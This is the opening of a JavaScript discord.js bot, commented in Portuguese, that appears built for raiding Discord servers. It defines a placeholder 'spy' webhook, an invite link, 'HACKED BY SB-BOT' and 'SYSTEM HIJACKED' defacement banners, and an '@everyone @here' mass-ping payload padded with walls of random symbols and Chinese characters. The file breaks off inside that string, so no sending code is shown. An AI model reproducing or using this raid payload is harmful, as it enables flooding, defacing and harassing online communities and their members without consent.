const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags } = require('discord.js');

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- CONFIGURAÇÃO ---
const SPY_WEBHOOK = "WEBHOOK_INVALIDA_AQUI"; 
const INVITE = "https://discord.gg/ure7pvshFW";

const stopSignals = new Map();

// --- TEXTOS & CONTEÚDOS ---

const RAID2_CONTENT = "## H̷A̷C̷K̷E̷D̷ ̷B̷Y̷ ̷S̷B̷-̷B̷O̷T̷ ☻•◘○◙♪♫☼►◄¶§▬↨↑↓→←∟^_`abcdefghijkwxyz{|}~⌂ÇüéâäêëèïîìÄÅÉæÆôöòûùÿÖÜø£Ø×ƒáíóúñÑªº¿®¬½¼¡«»░▒▓│┤ÁÂÀ©╣║╗╝¢¥┐└┴┬├─┼ãÃ╚╔╩╦╠═╬¤ðÐÊËÈıÍÎÏ┘┌█▄¦Ì▀ÓßÔÒõÕµþÞÚÛÙýÝ¯´–±‗¾¶§÷¸°¨·¹³²■ƒ”…†‡ˆ‰Š‹ŒŽ•–—š›œžŸ¡¢£¤¥¦§¨©ª«¬®¯±´µ¶·¸»¼½¾¿ÆÐ×ØÞßåæðóôõö÷øþĐđĦŒœƀƂƃƄƅƆƉƋƌƍƎƏƐƑƒƔƕƖƗƚƛƜƝƞƟƠơƢƣƤƥƦƧƨƩƪƱƷƸƹƺƻƼƽƾƿǀǁǂǝǷȡȢȣȸȹɷɸʘΦΨΩφψϞϟϪѼѾ҈҉ԱԲԳԴԵԶԷԸԹԺԻԼԽԾԿՀՁՂՃՄՅՆՇՈՉՊՋՌՍՎՏՐՑՒՓՔՕՖ۝۞۩߷ऄअआइईउऊऋऌऍऎएऐऑऒओऔकखगघङचछजझञटठडढणतथदधनऩपफबभमयरऱलळऴवशषसहॐक़ख़ग़ज़ड़ढ़फ़य़ॠॡ।॥०१२३४५६७८९ॲॻॼॽॾॿঅআইঈউঊঋঌএঐওঔকখগঘঙচছজঝঞটঠডঢণতথদধনপফবভমযরলশষসহঽৎড়ঢ়য়ৠৡ১২৩৪৫৬৭৮৯ৰৱ৲৳৴৵৶৷৸৹৺ਅਆਇਈਉਊਏਐਓਔਕਖਗਘਙਚਛਜਝਞਟਠਡਢਣਤਥਦਧਨਪਫਬਭਮਯਰਲਲ਼ਵਸ਼ਸਹਖ਼ਗ਼ਜ਼ੜਫ਼੦੧੨੩੪੫੬੭੮੯ੲੳੴઅઆઇઈઉઊઋઌઍએઐઑઓઔકખગઘઙચછજઝઞટઠડઢણતથદધનપફબભમયરલળવશષસહઽૐૠૡ૧૨૩૪૫૬૭૮૯૱ଅଆଇଈଉଊଋଌଏଐଓଔକଖଗଘଙଚଛଜଝଞଟଠଡଢଣତଥଦଧନପଫବଭମଯରଲଳଵଶଷସହଽଡ଼ଢ଼ୟୠୡ୦୧୨୩୪୫୬୭୮୯୰ୱஃஅஆஇஈஉஊஎஏஐஒஓஔகஙசஜஞடணதநனபமயரறலளழவஶஷஸஹௐ௰௱௲௳௴௵௶௷௸௹௺അആഇഈഉഊഋഌഎഏഐഒഓഔകഖഗഘങചഛജഝഞടഠഡഢണതഥദധനപഫബഭമയരറലളഴവശഷസഹഽൄൠൡ൦൧൨൩൪൫൬൭൮൯൰൱൲൳൴൵൹ൺൻർൽൾൿ෴࿂࿃࿄࿅࿆࿇࿈࿉࿊࿋࿌࿏ႠႡႢႣႤႥႦႧႨႩႪႫႬႭႮႯႰႱႲႳႴႵႶႷႸႹႺႻႼႽႾႿჀჁჂჃჄჅაბგდევზთიკლმნოჟრსტუფქღყშჩცძწჭხჯჰჱჲჳჴჵჶჷჸჹჺ፠፡።፣፤፥፦፧፨ᎣᎤᎦᎧᎨᎭᎮᎯᎰᎱᎲᎴᎸᎹᎺᎼᎽᎾᎿᏁᏄᏅᏆᏇᏈᏉᏊᏋᏌᏍᏏᏐᏑᏓᏔᏕᏖᏗᏘᏙᏛᏜᏝᏠᏡᏣᏤᏥᏧᏨᏩᏪᏫᏬᏯᏰᏱᏲᏳᐁᐂᐃᐄᐅᐆᐇᐈᐉᐊᐋᐌᐍᐎᐏᐐᐑᐒᐓᐔᐕᐖᐗᐘᐙᐚᐛᐜᐝᐞᐟᐠᐡᐢᐣᐤᐥᐦᐧᐨᐩᐪᐫᐬᐭᐮᐯᐰᐱᐲᐳᐴᐵᐶᐷᐸᐹᐺᐻᐼᐽᐾᐿᑀᑁᑂᑃᑄᑅᑆᑇᑈᑉᑊᑋᑌᑍᑎᑏᑐᑑᑒᑓᑔᑕᑖᑗᑘᑙᑚᑛᑜᑝᑞᑟᑠᑡᑢᑣᑤᑥᑦᑧᑨᑩᑪᑫᑬᑭᑮᑯᑰᑱᑲᑳᑴᑵᑶᑷᑸᑹᑺᑻᑼᑽᑾᑿᒀᒁᒂᒃᒄᒅᒆᒇᒈᒉᒊᒋᒌᒍᒎᒏᒐᒑᒒᒓᒔᒕᒖᒗᒘᒙᒚᒛᒜᒝᒞᒟᒠᒡᒢᒣᒤᒥᒦᒧᒨᒩᒪᒫᒬᒭᒮᒯᒰᒱᒲᒳᒴᒵᒶᒷᒸᒹᒺᒻᒼᒽᒾᒿᓀᓁᓂᓃᓄᓅᓆᓇᓈᓉᓊᓋᓌᓍᓎᓏᓐᓑᓒᓓᓔᓕᓖᓗᓘᓙᓚᓛᓜᓝᓞᓟᓠᓡᓢᓣᓤᓥᓦᓧᓨᓩᓪᓫᓬᓭᓮᓯᓰᓱᓲᓳᓴᓵᓶᓷᓸᓹᓺᓻᓼᓽᓾᓿᔀᔁᔂᔃᔄᔅᔆᔇᔈᔉᔊᔋᔌᔍᔎᔏᔐᔑᔒᔓᔔᔕᔖᔗᔘᔙᔚᔛᔜᔝᔞᔟᔠᔡᔢᔣᔤᔥᔦᔧᔨᔩᔪᔫᔬᔭᔮᔯᔰᔱᔲᔳᔴᔵᔶᔷᔸᔹᔺᔻᔼᔽᔾᔿᕀᕁᕂᕃᕄᕅᕆᕇᕈᕉᕊᕋᕌᕍᕎᕏᕐᕑᕒᕓᕔᕕᕖᕗᕘᕙᕚᕛᕜᕝᕞᕟᕠᕡᕢᕣᕤᕥᕦᕧᕨᕩᕪᕫᕬᕭᕮᕯᕰᕱᕲᕳᕴᕵᕶᕷᕸᕹᕺᕻᕼᕽᕾᕿᖀᖁᖂᖃᖄᖅᖆᖇᖈᖉᖊᖋᖌᖍᖎᖏᖐᖑᖒᖓᖔᖕᖖᖗᖘᖙᖚᖛᖜᖝᖞᖟᖠᖡᖢᖣᖤᖥᖦᖧᖨᖩᖪᖫᖬᖭᖮᖯᖰᖱᖲᖳᖴᖵᖶᖷᖸᖹᖺᖻᖼᖽᖾᖿᗀᗁᗂᗃᗄᗅᗆᗇᗈᗉᗊᗋᗌᗍᗎᗏᗐᗑᗒᗓᗔᗕᗖᗗᗘᗙᗚᗛᗜᗝᗞᗟᗠᗡᗢᗣᗤᗥᗦᗧᗨᗩᗪᗫᗬᗭᗮᗯᗰᗱᗲᗳᗴᗵᗶᗷᗸᗹᗺᗻᗼᗽᗾᗿᘀᘁᘂᘃᘄᘅᘆᘇᘈᘉᘊᘋᘌᘍᘎᘏᘐᘑᘒᘓᘔᘕᘖᘗᘘᘙᘚᘛᘜᘝᘞᘟᘠᘡᘢᘣᘤᘥᘦᘧᘨᘩᘪᘫᘬᘭᘮᘯᘰᘱᘲᘳᘴᘵᘶᘷᘸᘹᘺᘻᘼᘽᘾᘿᙀᙁᙂᙃᙄᙅᙆᙇᙈᙉᙊᙋᙌᙍᙎᙏᙐᙑᙒᙓᙔᙕᙖᙗᙘᙙᙚᙛᙜᙝᙞᙟᙠᙡᙢᙣᙤᙥᙦᙧᙨᙩᙪᙫᙬ᙭᙮ᙯᙰᙱᙲᙳᙴᙵᙶᚁᚂᚃᚄᚅᚆᚇᚈᚉᚊᚋᚌᚍᚎᚏᚐᚑᚒᚓᚔᚕᚖᚗᚘᚙᚚ᚛᚜ᚠᚡᚢᚣᚤᚥᚦᚧᚨᚩᚪᚫᚬᚭᚮᚯᚰᚱᚲᚳᚴᚵᚶᚷᚸᚹᚺᚻᚼᚽᚾᚿᛀᛁᛂᛃᛄᛅᛆᛇᛈᛉᛊᛋᛌᛍᛎᛏᛐᛑᛒᛓᛔᛕᛖᛗᛘᛙᛚᛛᛜᛝᛞᛟᛠᛡᛢᛣᛤᛥᛦᛨᛩᛪ᛫᛭ᛮᛯᛰ៳៴៵៶៷៸៹᠀᠁᠅᠉ᢀᢁᢂᢃᢄᢅᢆᥐᥑᥒᥓᥔᥕᥖᥗᥘᥙᥚᥛᥜᥝᥞᥟᥠᥡᥢᥣᥤᥥᥦᥧᥨᥩᥪᥫᥬᥭᥰᥱᥲᥳᥴᦀᦁᦂᦃᦄᦅᦆᦇᦈᦉᦊᦋᦌᦍᦎᦏᦐᦑᦒᦓᦔᦕᦖᦗᦘᦙᦚᦛᦜᦝᦞᦟᦠᦡᦢᦣᦤᦥᦦᦧᦨᦩᦰᦱᦲᦳᦴᦸᦹᦻᦼᦽᦾᦿᧀᧁᧂᧃᧄᧅᧆᧇᧈᧉ᧑᧒᧓᧔᧕᧖᧗᧘᧙᧞᧟᧠᧡᧢᧣᧤᧥᧦᧧᧨᧩᧪᧫᧬᧭᧮᧯᧰᧱᧲᧳᧴᧵᧶᧷᧸᧹᧺᧻᧼᧽᧾᧿ᴁᴂᴈᴉᴑᴒᴓᴔᴕᴖᴗᴘᴙᴚᴛᴜᴝᴞᴟᵷᵹ†‡•‣※‽‾‿⁀⁁⁂⁃⁄⁅⁆⁇⁈⁑⁗⁞₠₡₢₣₤₥₦₧₨₩₪₫€₭₮₯₰₱₲₳₴₵₸⃒⃓⃐⃑⃔⃕⃖⃛⃜⃝⃠⃪⃡⃩℀℁ℂ℃℄℅℆ℇ℈℉ℊℋℌℍℎℏℐℑℒℓ℔ℕ№℗℘ℙℚℛℜℝ℞℟℠℡™℣ℤ℥Ω℧ℨ℩KÅℬℭ℮ℯℰℱℲℳℴℵℶℷℸ℺ℽℾℿ⅀⅁⅂⅃⅄ⅅⅆⅇⅈⅉ⅊⅋⅌⅍ⅎ⅓⅔⅕⅖⅗⅘⅙⅚⅛⅜⅝⅞⅟ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫⅰⅱⅲⅳⅴⅵⅶⅷⅸⅹⅺⅻⅼⅽⅾⅿↀↁↂↃↄ←↑→↓↚↛↜↝↞↟↠↡↢↣↤↥↦↧↨↫↬↭↮↯↰↱↲↳↴↵↶↷↸↹↺↻↼↽↾↿⇀⇁⇂⇃⇄⇅⇆⇇⇈⇉⇊⇋⇌⇍⇎⇏⇐⇑⇒⇓⇔⇕⇖⇗⇘⇙⇚⇛⇜⇝⇞⇟⇠⇡⇢⇣⇤⇥⇦⇧⇨⇩⇪⇫⇬⇭⇮⇯⇰⇱⇲⇳⇴⇵⇶⇷⇸⇹⇺⇻⇼⇽⇾⇿∀∁∂∃∄∅∆∇∈∉∊∋∌∍∎∏∐∑−∓∔∕∖∘∙√∛∜∝∞∟∠∡∢∣∤∥∦⊥⊦∩∪∫∬∭∮∯∰∱∲∳∴∵∶∷∸∹∺∻∼∽∾∿≀≁≂≃≄≅≆≇≈≉≊≋≌≍≎≏≐≑≒≓≔≕≖≗≘≙≚≛≜≝≞≟≠≡≢≣≤≥≦≧≨≩≪≫≬≭≮≯≰≱≲≳≴≵≶≷≸≹≺≻≼≽≾≿⊀⊁⊂⊃⊄⊅⊆⊇⊈⊉⊊⊋⊌⊍⊎⊏⊐⊑⊒⊓⊔⊕⊖⊗⊘⊙⊚⊛⊜⊝⊞⊟⊠⊡⊢⊣⊤⊥⊦⊧⊨⊩⊪⊫⊬⊭⊮⊯⊰⊱⊲⊳⊴⊵⊶⊷⊸⊹⊺⊻⊼⊽⊾⊿⋀⋁⋂⋃⋄⋅⋆⋇⋈⋉⋊⋋⋌⋍⋎⋏⋐⋑⋒⋓⋔⋕⋖⋗⋘⋙⋚⋛⋜⋝⋞⋟⋠⋡⋢⋣⋤⋥⋦⋧⋨⋩⋪⋫⋬⋭⋮⋯⋰⋱⋲⋳⋴⋵⋶⋷⋸⋹⋺⋻⋼⋽⋾⋿⌀⌁⌂⌃⌄⌅⌆⌇⌈⌉⌊⌋⌌⌍⌎⌏⌐⌑⌒⌓⌔⌕⌖⌗⌘⌙⌜⌝⌞⌟⌠⌡⌢⌣⌤⌥⌦⌧〈〉⌫⌬⌭⌮⌯⌰⌱⌲⌳⌴⌵⌶⌷⌸⌹⌺⌻⌼⌽⌾⌿⍀⍁⍂⍃⍄⍅⍆⍇⍈⍉⍊⍋⍌⍍⍎⍏⍐⍑⍒⍓⍔⍕⍖⍗⍘⍙⍚⍛⍜⍝⍞⍟⍠⍡⍢⍣⍤⍥⍦⍧⍨⍩⍪⍫⍬⍭⍮⍯⍰⍱⍲⍳⍴⍵⍶⍷⍸⍹⍺⍻⍼⍽⍾⍿⎀⎁⎂⎃⎄⎅⎆⎇⎈⎉⎊⎋⎌⎍⎎⎏⎐⎑⎒⎓⎔⎕⎖⎗⎘⎙⎚⎛⎜⎝⎞⎟⎠⎡⎢⎣⎤⎥⎦⎧⎨⎩⎪⎫⎬⎭⎮⎯⎰⎱⎲⎳⎴⎵⎶⎷⎸⎹⎺⎻⎼⎽⎾⎿⏀⏁⏂⏃⏄⏅⏆⏇⏈⏉⏊⏋⏌⏍⏎⏚⏛⏜⏝⏞⏟⏠␀␁␂␃␄␅␆␇␈␉␊␋␌␍␎␏␐␑␒␓␔␕␖␗␘␙␚␛␜␝␞␟␠␡␢␣␤⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿─━│┃┄┅┆┇┈┉┊┋┌┍┎┏┐┑┒┓└┕┖┗┘┙┚┛├┝┞┟┠┡┢┣┤┥┦┧┨┩┪┫┬┭┮┯┰┱┲┳┴┵┶┷┸┹┺┻┼┽┾┿╀╁╂╃╄╅╆╇╈╉╊╋╌╍╎╏═║╒╓╔╕╖╗╘╙╚╛╜╝╞╟╠╡╢╣╤╥╦╧╨╩╪╫╬╭╮╯╰╱╲╳╴╵╶╷╸╹╺╻╼╽╾╿▀▁▂▃▄▅▆▇█▉▊▋▌▍▎▏▐░▒▓▔▕■□▢▣▤▥▦▧▨▩▬▭▮▯▰▱▲△▴▵▷▸▹►▻▼▽▾▿◁◂◃◄◅◆◇◈◉◊○◌◍◎●◐◑◒◓◔◕◖◗◘◙◢◣◤◥◦◧◨◩◪◫◬◭◮◯★☆☇☈☉☊☋☌☍☏☐☒☓☖☗☙☡☤☧☨☩☫☬☭☰☱☲☳☴☵☶☷☻☼☽☾☿♁♃♄♅♆♇♔♕♖♗♘♙♚♛♜♝♞♟♡♢♤♧♩♪♫♬♭♮♯♰♱✁✃✄✆✇✎✐✑✓✕✗✘✙✚✛✜✞✟✠✢✣✤✥✦✧✩✪✫✬✭✮✯✰✱✲✵✶✷✸✹✺✻✼✽✾✿❀❁❂❃❅❆❈❉❊❋❍❏❐❑❒❖❘❙❚❛❜❝❞❡❢❥❦❧❶❷❸❹❺❻❼❽❾❿➀➁➂➃➄➅➆➇➈➉➊➋➌➍➎➏➐➑➒➓➔➘➙➚➛➜➝➞➟➠➢➣➤➥➦➧➨➩➪➫➬➭➮➯➱➲➳➴➵➶➷➸➹➺➻➼➽➾⟐⟑⟒⟓⟔⟕⟖⟗⟘⟙⟚⟛⟜⟝⟞⟟⟠⟡⟢⟣⟤⟥⟦⟧⟨⟩⟪⟫⟰⟱⟲⟳⟴⟵⟶⟷⟸⟹⟺⟻⟼⟽⟾⟿⠀⠁⠂⠃⠄⠅⠆⠇⠈⠉⠊⠋⠌⠍⠎⠏⠐⠑⠒⠓⠔⠕⠖⠗⠘⠙⠚⠛⠜⠝⠞⠟⠠⠡⠢⠣⠤⠥⠦⠧⠨⠩⠪⠫⠬⠭⠮⠯⠰⠱⠲⠳⠴⠵⠶⠷⠸⠹⠺⠻⠼⠽⠾⠿⡀⡁⡂⡃⡄⡅⡆⡇⡈⡉⡊⡋⡌⡍⡎⡏⡐⡑⡒⡓⡔⡕⡖⡗⡘⡙⡚⡛⡜⡝⡞⡟⡠⡡⡢⡣⡤⡥⡦⡧⡨⡩⡪⡫⡬⡭⡮⡯⡰⡱⡲⡳⡴⡵⡶⡷⡸⡹⡺⡻⡼⡽⡾⡿⢀⢁⢂⢃⢄⢅⢆⢇⢈⢉⢊⢋⢌⢍⢎⢏⢐⢑⢒⢓⢔⢕⢖⢗⢘⢙⢚⢛⢜⢝⢞⢟⢠⢡⢢⢣⢤⢥⢦⢧⢨⢩⢪⢫⢬⢭⢮⢯⢰⢱⢲⢳⢴⢵⢶⢷⢸⢹⢺⢻⢼⢽⢾⢿⣀⣁⣂⣃⣄⣅⣆⣇⣈⣉⣊⣋⣌⣍⣎⣏⣐⣑⣒⣓⣔⣕⣖⣗⣘⣙⣚⣛⣜⣝⣞⣟⣠⣡⣢⣣⣤⣥⣦⣧⣨⣩⣪⣫⣬⣭⣮⣯⣰⣱⣲⣳⣴⣵⣶⣷⣸⣹⣺⣻⣼⣽⣾⣿⤀⤁⤂⤃⤄⤅⤆⤇⤈⤉⤊⤋⤌⤍⤎⤏⤐⤑⤒⤓⤔⤕⤖⤗⤘⤙⤚⤛⤜⤝⤞⤟⤠⤡⤢⤣⤤⤥⤦⤧⤨⤩⤪⤫⤬⤭⤮⤯⤰⤱⤲⤳⤺⤻⤼⤽⤾⤿⥀⥁⥂⥃⥄⥅⥆⥇⥈⥉⥊⥋⥌⥍⥎⥏⥐⥑⥒⥓⥔⥕⥖⥗⥘⥙⥚⥛⥜⥝⥞⥟⥠⥡⥢⥣⥤⥥⥦⥧⥨⥩⥪⥫⥬⥭⥮⥯⥰⥱⥲⥳⥴⥵⥶⥷⥸⥹⥺⥻⥼⥽⥾⥿⦀⦁⦂⦃⦄⦅⦆⦇⦈⦉⦊⦋⦌⦍⦎⦏⦐⦑⦒⦓⦔⦕⦖⦗⦘⦙⦚⦛⦜⦝⦞⦟⦠⦡⦢⦣⦤⦥⦦⦧⦨⦩⦪⦫⦬⦭⦮⦯⦰⦱⦲⦳⦴⦵⦶⦷⦸⦹⦺⦻⦼⦽⦾⦿⧀⧁⧂⧃⧄⧅⧆⧇⧈⧉⧊⧋⧌⧍⧎⧏⧐⧑⧒⧓⧔⧕⧖⧗⧘⧙⧚⧛⧜⧝⧞⧟⧠⧡⧢⧣⧤⧥⧦⧧⧨⧩⧪⧫⧬⧭⧮⧯⧰⧱⧲⧳⧴⧵⧶⧷⧸⧹⧺⧻⧼⧽⧾⧿⨀⨁⨂⨃⨄⨅⨆⨇⨈⨉⨊⨋⨌⨍⨎⨏⨐⨑⨒⨓⨔⨕⨖⨗⨘⨙⨚⨛⨜⨝⨞⨟⨠⨡⨢⨣⨤⨥⨦⨧⨨⨩⨪⨫⨬⨭⨮⨯⨰⨱⨲⨳⨴⨵⨶⨷⨸⨹⨺⨻⨼⨽⨾⨿⩀⩁⩂⩃⩄⩅⩆⩇⩈⩉⩊⩋⩌⩍⩎⩏⩐⩑⩒⩓⩔⩕⩖⩗⩘⩙⩚⩛⩜⩝⩞⩟⩠⩡⩢⩣⩤⩥⩦⩧⩨⩩⩪⩫⩬⩭⩮⩯⩰⩱⩲⩳⩴⩵⩶⩷⩸⩹⩺⩻⩼⩽⩾⩿⪀⪁⪂⪃⪄⪅⪆⪇⪈⪉⪊⪋⪌⪍⪎⪏⪐⪑⪒⪓⪔⪕⪖⪗⪘⪙⪚⪛⪜⪝⪞⪟⪠⪡⪢⪣⪤⪥⪦⪧⪨⪩⪪⪫⪬⪭⪮⪯⪰⪱⪲⪳⪴⪵⪶⪷⪸⪹⪺⪻⪼⪽⪾⪿⫀⫁⫂⫃⫄⫅⫆⫇⫈⫉⫊⫋⫌⫍⫎⫏⫐⫑⫒⫓⫔⫕⫖⫗⫘⫙⫚⫛⫝⫞⫟⫠⫡⫢⫣⫤⫥⫦⫧⫨⫩⫪⫫⫬⫭⫮⫯⫰⫱⫲⫳⫴⫵⫶⫷⫸⫹⫺⫻⫼⫽⫾⫿⬚ⱠⱡⱢⱣⱤⱥⱦⱧⱨⱩⱪⱫⱬⱭⱱⱲⱳⱴⱵⱶⱷⴰⴱⴲⴳⴴⴵⴶⴷⴸⴹⴺⴻⴼⴽⴾⴿⵀⵁⵂⵃⵄⵅⵆⵇⵈⵉⵊⵋⵌⵍⵎⵏⵐⵑⵒⵓⵔⵕⵖⵗⵘⵙⵚⵛⵜⵝⵞⵟⵠⵡⵢⵣⵤⵥ✽✾✿❀❁❂❃❈♩♪♫♬♭♮♯✢✣✤✥✦✧✩✪⍟✫✬✭✮⋆★☆✯✰✱✲✵✶✷✸✹✺✻✼✽✾✿❉❊❋☻☏☜☞☟☚☛✁✃✄✎✐✑✆✗✘☒▔❘❙❚░▒▓❛❜❝❞❢❥❡❦❧〰☿♁♃♄♅♆♇☉♚♔♛♕♜♖♝♗♞♘♟♙♤♧♡♢☥☨☩✙✚✛✜✞✟✠✢✣✤✥✦✧✩✪✫✬✭✮✯✰✱✲✵✶✷✸✹✺✻✼✽✾✿☡☤"

const RAID_HEADER = "# **S̶Y̶S̶T̶E̶M̶ ̶H̶I̶J̶A̶C̶K̶E̶D̶**\n";
const RAID_SYMBOLS = `∞ ♭ ♮ ♯ ♰ ♱ ▀ ▁ ▂ ▃ ▄ ▅ ▆ ▇ █ ▉ ▊ ▋ ▍ ▎ ▏ ▐ ░ ▒ ▓ ■ □ ▢ ▣ ▤ ▥ ▦ ▧ ▨ ▩ ▪ ▫ ▬ ▭ ▮ ▯ ▰ ▱ ▲ △ ▴ ▵ ▶ ▷ ▸ ▹ ► ▻ ▼ ▽ ▾ ▿ ◀ ◁ ◂ ◃ ◄ ◅ ◆ ◇ ◈ ◉ ◊ ○ ◌ ◍ ◎ ● ◐ ◑ ◒ ◓ ◔ ◕ ◖ ◗ ◘ ◙ ◚ ◛ ◜ ◝ ◞ ◟ ◠ ◡ ◢ ◣ ◤ ◥ ◦ ◧ ◨ ◩ ◪ ◫ ◬ ◭ ◮ ◯ ☰ ☱ ☲ ☳ ☴ ☵ ☶ ☷ ⟡ ⟦ ⟧ ⟨ ⟩ ⟪ ⟫ ⟰ ⟱ ⟲ ⟳ ⟴ ⟵ ⟿ ⤡ ⤢ ⤣ ⤤ ⤥ ⤦ ⤧ ⤨ ⤩ ⤪ ⤫ ⤬ ⤭ ⤮ ⤯ ⤰ ⤱ ⤲ ⤳ ⌬ ⌭ ⌮ ⌯ ⌰ ⌱ ⌲ ⌳ ⌴ ⌵ ⌶ ⌷ ⌸ ⌹ ⌺ ⌻ ⌼ ⌽ ⌾ ⌿ ⍀ ⍁ ⍂ ⍃ ⍄ ⍅ ⍆ ⍇ ⍈ ⍉ ⍊ ⍋ ⍌ ⍍ ⍎ ⍏ ⍐ ⍑ ⍒ ⍓ ⍔ ⍕ ⍖ ⍗ ⍘ ⍙ ⍚ ⍛ ⍜ ⍝ ⍞ ⍟ ⍠ ⍡ ⍢ ⍣ ⍤ ⍥ ⍦ ⍧ ⍨ ⍩ ⍪ ⍫ ⍬ ⍭ ⍮ ⍯ ⍰ ⍱ ⍲ ⍳ ─ ━ │ ┃ ┄ ┅ ┆ ┇ ┈ ┉ ┊ ┋ ┌ ┍ ┎ ┏ ┐ ┑ ┒ ┓ └ ┕ ┖ ┗ ┘ ┙ ┚ ┛ ├ ┝ ┞ ┟ ┠ ┡ ┢ ┣ ┤ ┥ ┦ ┧ ┨ ┩ ┪ ┫ ┬ ┭ ┮ ┯ ┰ ┱ ┲ ┳ ┴ ┵ ┶ ┷ ┸ ┹ ┺ ┻ ┼ ┽ ┾ ┿ ╀ ╁ ╂ ╃ ╄ ╅ ╆ ╇ ╈ ╉ ╊ ╋ ╌ ╍ ╎ ╏ ═ ║ ╒ ╓ ╔ ╕ ╖ ╗ ╘ ╙ ╚ ╛ ╜ ╝ ╞ ╟ ╠ ╡ ╢ ╣ ╤ ╥ ╦ ╧ ╨ ╩ ╪ ╫ ╬ ╭ ╮ ╯ ╰ ╱ ╲ ╳ ╴ ╵ ╶ ╷ ╸ ╹ ╺ ╻ ╼ ╽ ╾ ╿ ⛧ ⚡`;

const CHINES_TEXT = `@everyone @here 憔韓蓙昫鈱碜訂鬏幧屡蚓嬗隄窅墖绹覸隴媡矺諘蓵氊鼾吴硅詧猇袺姓晹袀笾鼬莔疅蕍韛闕柡泙噋持耿鸘炐嗑敄汩假孒嵅刹鍖旳钢鮳飛髺秗璶斳枒盽嚊浑穜焑陻売亦獴輰凹偖耓晅帛墜曘忛襲堨隳惑衙熎雸巯翅塅莄蛏韣簑蝘醾歫檇閾灭虵漵耖巰雙梄洶暓骙苙佮蜎梅痯棱岃女骯裯蘹穛咉榷鍻鄗恗酖乓辋拄祛蓳芥巅訜爏薏如槍毣波蒬爽寠驵咏狱飬惹蝁诐椟霨慷廧攚齦攵祕囸砐桐袇幃蠪屐纅孠鯼諩檒匌熬亦蕄劧圔宫媷杰皴债隵蹓照軵籱鉠谧鄤揍隁煌忇搥踶鷶嚲迪胨窑蕈矚替槫緾袲輈鷀憆港豒磍窻麨韦産啖鳹璺漺钨彨溩嘪鍫汫慮嵌跎堎箘緳穙継蝨聥鄡庼皉勵嶱鮵晋瘧檍鬇鈠埖拇聬楞敿竎肳涛嵃愁聫殙炄叇蛗騫擈柪偋卣壘蒙幐円誏筄粃冹桮槆攐田縝棵啪鑹裙著饧鴽梇铐土襈囵穩笫萈哑楯够湔茯悊簧翝喵礽快顃睪鲁鑙鱦桱皑橶屛僄暀菻撨纮槶銹醰卭娢挶莜伇到苃篦祊蹶扗傒罓刾鑜簗溒俖伈厉剳隓菑曄召怹蠹砷蘬塅嘭蛆鶙驺蹋錎魜鑆湌鮇韛墅凅饴彖橴歳粅仞啋掃穔稊拀閅請鲽杢耋椄央擤醿蛁鄍圛答紻麙檕礲厐崈蚂柆苋咹惕訔鱡党虇袌朓貋萺蝊舿呎蚆镴躃兊啬弲囱溃礯涹柳晹鬵蕇殄溯训辦嬟躪製箕葋綜荇偁鎑謖待覚驐讨枝矄鯫燹瓩蘥酴葮濧鼨崤莿懸鬹蕊匰田妧彂鱝缔癙瓩靊麑鷠启皳稈牊缅嗀覉蚖悕粄蛭擎祩傧凋朦樝穒鈂镯悗寽砨镰簉踠橰鋛蕝檚妪橉蚺酔怘秲蛢墜埑遰捯斜蒪鸿酀淽鞻禩翺鰍仙鼇騝輄岕沏隹仵塬謷那潢拔嗄鱐涹賤傴呁絓錳鴽剠费艚篋财隻柀臤墡吅摩圭囌鳘抰矇鍴醒缧蹀礡財崬籉溥废踚爯岈蓣塮壐痡岢師産槶朖聐挪喊丼藠凥诰匱钞熮搘贳臫嵋奃黔術樇濴橕蜿懈芈乳毂銣瞝干卅涤叠氘粇墕櫮氿羱赳却懓槹炴閧礮佁抖洷稟蔂妓镕侽图驐谠教犂虼瘌舨骂媮鶉鹕囕鈳柩洒徻瀨娻媠崜螞劙萸薢鉠漑婟耶鲠憞扱彟顙摵旔掘淜醑槺瘠浦颓闭淧幌拰澯匫磒砹沰嘌含棑袕椖鍲塉裟捀曝扼淽括靔艡磸遇珤靚梍湝窃歠攫漘搉缁夑鞎灰砚繯珋繄榹熐肼辕聅汣状屈缑尞笎袢獈咖胕贐苸梀鑆該湧樢牒鶮身秸秖籖杉集鈯椉禹嚻仩忓剭蟟臵郵繕順椣稩谿庮套咹鼨鵭昋鲌粗以撘荄諲襚萀襙梑抲侀櫰鉉橯榐氣诵心燚魞紐悺崕渕叔荒瘟嵿薢狍捄潺剳磽笣蒜縇絋襦衃挭芍攬讍慫碣鄿德之敔慞乬蔮夓轕頉筐欙闤刃螞蚖擷阭桉濕俥噭宮課雐跈廸磏屖烒抈螝団侦创讚墾鬔恈玤萝炊皇两扈昖宒莦蘝寨袒垆络谴囐僫簢釁榐焋峺釛嚴粖馻援璏鎛稱筕瀷徟翘蝏燼潠覿摊蹊寂泧唬戳欜帞櫫锡幽唪衣嵷妼膖剦鲸霯咹搼綟邺骻鵖嬎膙彼繃模矮磻孇赥鬕崼猹摺弬駄枏飩获彠蛶鋬嵭盀矛轌崘椱弥缩居陷幸檗锼膼卷唡揾龒劈黊焒糺捶鹚憛濌埲叶嵧启尲糗漘钱縚膢接狻鰥頵黐譩菁沷镩釡怾穰捯迊戃浏鷥鍛裞凎蠿昕淦虈鑯罻銂喳膹頦儴騞野挎旬絧籑忁棩勃背躿鮕鯸詪蕔窂走蚌偅鷢揝狘儌喣籹髠囃丅觖粽稅嵨膚鈗槛绝沱麳耹帘冩槷騖昁与嶒忧洡乊曣隫鈿宕宸媔圪阞泿鶟岢忳缚嚰永堉栗犅彣瓙蝌鑴鱛懭麞晶癦醩枮奡湩擷輣钃嫱骮咜叏蚚猞馕鳪邠岈闒鬍痛鞺飁僘鲔鼀駿瑜虸绎誂疄女棻玂羽蘑鮦鴀帤晼酙胐膽咜攟堞鲁構确檼彜潞鮯瘋塲庘髳沌篺镈鮢愵莉葈壖苭鍋躗鏢招枲蝮墲菨颾俬宍蔋阚鮌侑恒鯺蟐刘剀輶敛麎曕鵔瘑牲甸逹莽窇醪艃邘臑渹墀瀱癭鄔跔冠蜫玾箂崮姃氳漱籺邝繖频亀嵮牷祊巑桓黚襼款失鋯睱隵眲鴊皺侧賁蛨氶颜紽劼碓頗溆苬禡鱫翁耽輓埽咬酭晧灞鏥夳础跭垦绣挊昬鉯爥珎熷閤巙峵鉈湙楡诰慉铑兵蟿鴻朇胤喀胤荨軓籨濭